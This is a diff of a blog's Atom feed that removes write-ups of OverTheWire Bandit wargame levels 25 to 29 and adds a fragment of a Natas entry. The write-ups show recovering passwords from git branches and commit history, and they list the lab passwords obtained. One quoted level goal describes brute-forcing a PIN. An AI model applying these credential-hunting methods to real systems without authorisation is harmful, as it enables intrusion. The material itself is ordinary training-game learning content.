-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;There is a git repository at &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;ssh://bandit29-git@localhost/home/bandit29-git/repo&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; The password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the user &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;bandit29-git&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; is the same as &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the user &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;bandit29&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-Clone the repository and find the password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the next level.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;hey-the-last-one-said-to-do-this-too---firstly-lets-pull-the-repo-into-a-tmp-dir&quot;&gt;Hey, the last one said to do this too - Firstly, lets pull the repo into a tmp dir.&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit29@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/zd29
-bandit29@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/zd29
-bandit29@bandit:/tmp/zd29&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
-Cloning into &lt;span class=&quot;s1&quot;&gt;&apos;repo&apos;&lt;/span&gt;...
-Could not create directory &lt;span class=&quot;s1&quot;&gt;&apos;/home/bandit29/.ssh&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-The authenticity of host &lt;span class=&quot;s1&quot;&gt;&apos;localhost (127.0.0.1)&apos;&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;&apos;t be established.
-ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
-Are you sure you want to continue connecting (yes/no)? yes
-Failed to add the host to the list of known hosts (/home/bandit29/.ssh/known_hosts).
-This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
-
-bandit29-git@localhost&apos;&lt;/span&gt;s password:
-remote: Counting objects: 16, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;11/11&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Total 16 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Receiving objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;16/16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Resolving deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2/2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;time-to-look-around&quot;&gt;Time to look around&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit29@bandit:/tmp/zd29/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;README.md
-bandit29@bandit:/tmp/zd29/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;README.md
-&lt;span class=&quot;c&quot;&gt;# Bandit Notes&lt;/span&gt;
-Some notes &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;bandit30 of bandit.
-
-&lt;span class=&quot;c&quot;&gt;## credentials&lt;/span&gt;
-
-- username: bandit30
-- password: &amp;lt;no passwords &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;production!&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;hey-hey-hey-production&quot;&gt;Hey hey hey, production..&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit29@bandit:/tmp/zd29/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
-  origin/HEAD -&amp;gt; origin/master
-  origin/dev
-  origin/master
-  origin/sploits-dev
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;look-a-wild-dev-branch-appears-i-wonder-whats-inside&quot;&gt;Look, a wild dev branch appears! I wonder what’s inside..&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit29@bandit:/tmp/zd29/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout dev
-Branch dev &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;up to track remote branch dev from origin.
-Switched to a new branch &lt;span class=&quot;s1&quot;&gt;&apos;dev&apos;&lt;/span&gt;
-bandit29@bandit:/tmp/zd29/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;code  README.md
-bandit29@bandit:/tmp/zd29/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;README.md
-&lt;span class=&quot;c&quot;&gt;# Bandit Notes&lt;/span&gt;
-Some notes &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;bandit30 of bandit.
-
-&lt;span class=&quot;c&quot;&gt;## credentials&lt;/span&gt;
-
-- username: bandit30
-- password: 5b90576bedb2cc04c86a9e924ce42faf
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;VICTORY&lt;/p&gt;
-
-&lt;p&gt;Password is: 5b90576bedb2cc04c86a9e924ce42faf&lt;/p&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Bandit" /><summary type="html">Level goal ```bash There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo. The password for the user bandit29-git is the same as for the user bandit29.</summary></entry><entry><title type="html">Overthewire Bandit Level 28 To 29</title><link href="http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-28-to-29.html" rel="alternate" type="text/html" title="Overthewire Bandit Level 28 To 29" /><published>2021-04-09T11:22:00+01:00</published><updated>2021-04-09T11:22:00+01:00</updated><id>http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-28-to-29</id><content type="html" xml:base="http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-28-to-29.html">&lt;h1 id=&quot;level-goal&quot;&gt;Level goal&lt;/h1&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;There is a git repository at &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;ssh://bandit28-git@localhost/home/bandit28-git/repo&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; The password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the user &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;bandit28-git&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; is the same as &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the user &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;bandit28&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-Clone the repository and find the password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the next level.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;back-to-regularly-scheduled-linuxing---firstly-lets-pull-the-repo-into-a-tmp-dir&quot;&gt;Back to regularly scheduled linuxing - Firstly, lets pull the repo into a tmp dir.&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit28@bandit:/tmp/zd28/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/zd28
-bandit28@bandit:/tmp/zd28/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/zd28
-bandit28@bandit:/tmp/zd28/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
-bandit28@bandit:/tmp/zd28/repo2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;repo
-bandit28@bandit:/tmp/zd28/repo2/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;README.md
-&lt;span class=&quot;c&quot;&gt;# Bandit Notes&lt;/span&gt;
-Some notes &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;level29 of bandit.
-
-&lt;span class=&quot;c&quot;&gt;## credentials&lt;/span&gt;
-
-- username: bandit29
-- password: xxxxxxxxxx
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;mmmmkay-thats-helpful-anything-in-the-log&quot;&gt;Mmmmkay, that’s helpful. Anything in the log?&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit28@bandit:/tmp/zd28/repo2/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-commit edd935d60906b33f0619605abd1689808ccdd5ee
-Author: Morla Porla &amp;lt;morla@overthewire.org&amp;gt;
-Date:   Thu May 7 20:14:49 2020 +0200
-
-    fix info leak
-
-commit c086d11a00c0648d095d04c089786efef5e01264
-Author: Morla Porla &amp;lt;morla@overthewire.org&amp;gt;
-Date:   Thu May 7 20:14:49 2020 +0200
-
-    add missing data
-
-commit de2ebe2d5fd1598cd547f4d56247e053be3fdc38
-Author: Ben Dover &amp;lt;noone@overthewire.org&amp;gt;
-Date:   Thu May 7 20:14:49 2020 +0200
-
-    initial commit of README.md
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;oooo-we-can-look-at-the-file-history-ref-httpsgit-scmcombookenv2git-basics-viewing-the-commit-history&quot;&gt;Oooo we can look at the file history (ref: https://git-scm.com/book/en/v2/Git-Basics-Viewing-the-Commit-History)&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Date:   Thu May 7 20:14:49 2020 +0200
-
-    fix info leak
-
-diff &lt;span class=&quot;nt&quot;&gt;--git&lt;/span&gt; a/README.md b/README.md
-index 3f7cee8..5c6457b 100644
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; a/README.md
-+++ b/README.md
-@@ &lt;span class=&quot;nt&quot;&gt;-4&lt;/span&gt;,5 +4,5 @@ Some notes &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;level29 of bandit.
- &lt;span class=&quot;c&quot;&gt;## credentials&lt;/span&gt;
-
- - username: bandit29
-&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; password: bbc96594b4e001778eee9975372716b2
-+- password: xxxxxxxxxx
-
-
-commit c086d11a00c0648d095d04c089786efef5e01264
-Author: Morla Porla &amp;lt;morla@overthewire.org&amp;gt;
-Date:   Thu May 7 20:14:49 2020 +0200
-
-    add missing data
-
-diff &lt;span class=&quot;nt&quot;&gt;--git&lt;/span&gt; a/README.md b/README.md
-bandit28@bandit:/tmp/zd28/repo2/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;clear
-bandit28@bandit:/tmp/zd28/repo2/repo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
-commit edd935d60906b33f0619605abd1689808ccdd5ee
-Author: Morla Porla &amp;lt;morla@overthewire.org&amp;gt;
-Date:   Thu May 7 20:14:49 2020 +0200
-
-    fix info leak
-
-diff &lt;span class=&quot;nt&quot;&gt;--git&lt;/span&gt; a/README.md b/README.md
-index 3f7cee8..5c6457b 100644
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; a/README.md
-+++ b/README.md
-@@ &lt;span class=&quot;nt&quot;&gt;-4&lt;/span&gt;,5 +4,5 @@ Some notes &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;level29 of bandit.
- &lt;span class=&quot;c&quot;&gt;## credentials&lt;/span&gt;
-
- - username: bandit29
-&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; password: bbc96594b4e001778eee9975372716b2
-+- password: xxxxxxxxxx
-
-
-commit c086d11a00c0648d095d04c089786efef5e01264
-Author: Morla Porla &amp;lt;morla@overthewire.org&amp;gt;
-Date:   Thu May 7 20:14:49 2020 +0200
-
-    add missing data
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;VICTORY&lt;/p&gt;
-
-&lt;p&gt;Password is: bbc96594b4e001778eee9975372716b2&lt;/p&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Bandit" /><summary type="html">Level goal ```bash There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28.</summary></entry><entry><title type="html">Overthewire Bandit Level 26 To 28 (cheated)</title><link href="http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-26-to-28-(CHEATED).html" rel="alternate" type="text/html" title="Overthewire Bandit Level 26 To 28 (cheated)" /><published>2021-04-09T11:21:00+01:00</published><updated>2021-04-09T11:21:00+01:00</updated><id>http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-26-to-28-(CHEATED)</id><content type="html" xml:base="http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-26-to-28-(CHEATED).html">&lt;h1 id=&quot;level-goal&quot;&gt;Level goal&lt;/h1&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Logging &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;to bandit26 from bandit25 should be fairly easy… The shell &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user bandit26 is not &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;/bin/bash&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;, but something &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Find out what it is, how it works and how to &lt;span class=&quot;nb&quot;&gt;break &lt;/span&gt;out of it.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Good job getting a shell! Now hurry and grab the password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;bandit27!
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;i-had-to-google-it-because-i-had-no-idea-wtf-was-going-on&quot;&gt;I had to google it because I had no idea WTF was going on.&lt;/h2&gt;
-
-&lt;p&gt;Password to 27: 3ba3118a22e93127a4ed485be72ef5ea
-Password to 28: 0ef186ac70e04ea33b4c1853d2526fa2&lt;/p&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Bandit" /><summary type="html">Level goal Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.</summary></entry><entry><title type="html">Overthewire Bandit Level 25 To 26</title><link href="http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-25-to-26.html" rel="alternate" type="text/html" title="Overthewire Bandit Level 25 To 26" /><published>2021-04-09T11:21:00+01:00</published><updated>2021-04-09T11:21:00+01:00</updated><id>http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-25-to-26</id><content type="html" xml:base="http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-25-to-26.html">&lt;h1 id=&quot;level-goal&quot;&gt;Level goal&lt;/h1&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;A daemon is listening on port 30002 and will give you the password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;bandit25 &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;given the password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;i-had-to-google-it-because-i-had-no-idea-wtf-was-going-on&quot;&gt;I had to google it because I had no idea WTF was going on.&lt;/h2&gt;
-
-&lt;p&gt;Password: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z&lt;/p&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Bandit" /><summary type="html">Level goal A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.</summary></entry></feed>
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Natas" /><summary type="html">Level 8</summary></entry></feed>
